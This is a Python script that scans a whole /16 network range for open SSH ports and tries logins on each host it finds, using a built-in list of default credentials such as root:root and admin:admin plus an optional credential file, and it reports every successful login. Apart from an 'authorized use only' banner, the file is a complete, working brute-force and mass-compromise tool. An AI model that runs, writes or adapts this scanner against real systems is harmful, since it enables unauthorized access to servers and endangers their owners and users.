import socket
import paramiko
import threading
import sys
from queue import Queue  # Ensure this import is at the top - for Python 3's queue module
from rich.console import Console
from rich.progress import Progress
import argparse  # For command-line arguments

# Initialize Rich console
console = Console()

# Warning message with colors
console.print("\n[bold red]! WARNING ![/bold red]", justify="center")
console.print("[red]This script is for educational/authorized use only.[/red]\n", justify="center")
console.print("Unauthorized port scanning and login attempts may violate laws.\n", style="yellow", justify="center")
console.print("Use this only on networks you have explicit permission to scan.\n", style="yellow", justify="center")

# --- Global Variables (defined outside any function) ---
queue = Queue()  # Queue for IP addresses to scan
MAX_THREADS = 100  # Default number of threads, can be overridden by command-line argument
TIMEOUT = 1.5      # Default timeout for connection attempts, can be overridden
DEFAULT_CREDENTIALS = [ # Expanded list of default credentials
    ('root', 'root'),
    ('admin', 'admin'),
    ('user', 'user'),
    ('guest', 'guest'),
    ('administrator', 'administrator'),
    ('root', 'password'),
    ('admin', 'password'),
    ('user', 'password'),
    ('guest', 'password'),
    ('administrator', 'password'),
    ('root', '123456'),
    ('admin', '123456'),
    ('user', '123456'),
    ('guest', '123456'),
    ('administrator', '123456'),
    ('root', 'abcd'),
    ('admin', 'abcd'),
    ('root', ''),     # Try empty password for root
    ('admin', '')    # Try empty password for admin
]

def load_credentials_from_file(filename):
    """Loads credentials from a file (username:password per line)."""
    credentials = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    username, password = line.split(":", 1)
                    credentials.append((username.strip(), password.strip()))
        if credentials:
            console.print(f"[cyan]Loaded [bold]{len(credentials)}[/bold] credentials from [cyan]{filename}[/cyan]")
        else:
            console.print(f"[yellow]Warning: No valid credentials found in [cyan]{filename}[/cyan][/yellow]")
    except FileNotFoundError:
        console.print(f"[red]Error: Credential file not found: [cyan]{filename}[/cyan][/red]")
        return None # Indicate file loading failure
    return credentials

def check_ssh(ip, progress, task_id, credentials_list):
    """Checks SSH service and attempts login with provided credentials."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(TIMEOUT)
            if sock.connect_ex((ip, 22)) == 0: # Check if port 22 is open
                for username, password in credentials_list:
                    console.print(f"[dim][*] Testing {ip} - {username}:{password}...[/dim]")
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        ssh.connect(ip, username=username, password=password, timeout=TIMEOUT)
                        console.print(f"[green][+] Successful login: [bold]{ip}[/bold] - {username}:{password}[/green]")
                        progress.update(task_id, description=f"[green]Scanning {ip}[/green] - [bold green]Success![/bold green]", advance=1)
                        return  # Exit after successful login
                    except paramiko.AuthenticationException:
                        pass # Try next credential on auth failure
                    except Exception as e:
                        console.print(f"[yellow][!] SSH Error on {ip} with {username}:{password}: {e}[/yellow]")
                        pass # Try next credential on other errors
                    finally:
                        ssh.close()
                else: # for...else: no successful login after trying all credentials
                    progress.update(task_id, advance=1) # Advance progress bar, no success
            else:
                progress.update(task_id, advance=1) # Advance progress bar, port closed
    except Exception as overall_error:
        progress.update(task_id, advance=1) # Advance progress bar on overall error
        console.print(f"[yellow][!] Overall Check Error on {ip}: {overall_error}[/yellow]")
        pass

def worker(progress, task_id, credentials_list):
    """Worker thread to process IPs from the queue."""
    while True:
        ip = queue.get()
        check_ssh(ip, progress, task_id, credentials_list) # Call check_ssh with credentials
        queue.task_done()

def main():
    """Main function to setup argument parsing and run the scan."""
    global MAX_THREADS  # Declare MAX_THREADS as global at the VERY beginning of main()
    global TIMEOUT      # Declare TIMEOUT as global at the VERY beginning of main()

    parser = argparse.ArgumentParser(description="Multithreaded SSH Scanner with enhanced credential options.")
    parser.add_argument("ip_prefix", help="IP prefix to scan (e.g., 192.168)")
    parser.add_argument("-c", "--creds-file", type=str, help="Path to custom credentials file (username:password)")
    parser.add_argument("-th", "--threads", type=int, default=MAX_THREADS, help=f"Number of threads (default: {MAX_THREADS})")
    parser.add_argument("-t", "--timeout", type=float, default=TIMEOUT, help=f"Timeout for connection attempts (default: {TIMEOUT} seconds)")

    args = parser.parse_args()

    ip_prefix = args.ip_prefix
    octets = ip_prefix.split('.')

    if len(octets) != 2:
        console.print("[red]\[!][/red] Invalid IP format. Use [bold]xx.xx[/bold] (e.g., 192.168)")
        sys.exit()

    try:
        if not (0 <= int(octets[0]) <= 255 and 0 <= int(octets[1]) <= 255):
            raise ValueError
    except ValueError:
        console.print("[red]\[!][/red] Invalid octet values. Must be 0-255")
        sys.exit()

    ips = [f"{ip_prefix}.{i}.{j}" for i in range(256) for j in range(256)] # Generate IP range
    total_ips = len(ips)

    MAX_THREADS = args.threads # Override global MAX_THREADS with command-line value
    TIMEOUT = args.timeout     # Override global TIMEOUT with command-line value

    custom_credentials = [] # Initialize custom credentials list
    if args.creds_file: # Load custom credentials if file is specified
        loaded_creds = load_credentials_from_file(args.creds_file)
        if loaded_creds: # Check if loading was successful (not None)
            custom_credentials.extend(loaded_creds)

    effective_credentials = custom_credentials + DEFAULT_CREDENTIALS # Combine credentials (custom first)

    console.print(f"\n[bold]Starting Enhanced SSH Scanner[/bold]")
    console.print(f"• Target Range: [cyan]{ip_prefix}.0.0/16[/cyan]")
    console.print(f"• Total IPs: [cyan]{total_ips}[/cyan]")
    console.print(f"• Threads: [cyan]{MAX_THREADS}[/cyan]")
    console.print(f"• Timeout: [cyan]{TIMEOUT}s[/cyan]")
    console.print(f"• Credentials sets: [cyan]{len(effective_credentials)}[/cyan]\n")

    if args.creds_file:
        console.print(f"[cyan]Using credentials from file: [bold]{args.creds_file}[/bold][/cyan]")
    else:
        console.print(f"[cyan]Using [bold]default[/bold] credentials.[/cyan]")
    console.print("\n[bold]Scan in progress...[/bold]\n")

    with Progress() as progress: # Progress bar context
        task_id = progress.add_task("[cyan]Scanning SSH...", total=total_ips, start=False)
        progress.start_task(task_id)

        for _ in range(MAX_THREADS): # Start worker threads
            threading.Thread(target=worker, args=(progress, task_id, effective_credentials), daemon=True).start()

        for ip in ips: # Add IPs to the queue
            queue.put(ip)
            progress.update(task_id, description=f"[cyan]Scanning {ip}[/cyan]", advance=0)

        queue.join() # Wait for queue to be empty
        progress.stop_task(task_id)
        console.print("\n[bold green]Scan completed.[/bold green]")

if __name__ == "__main__":
    main()
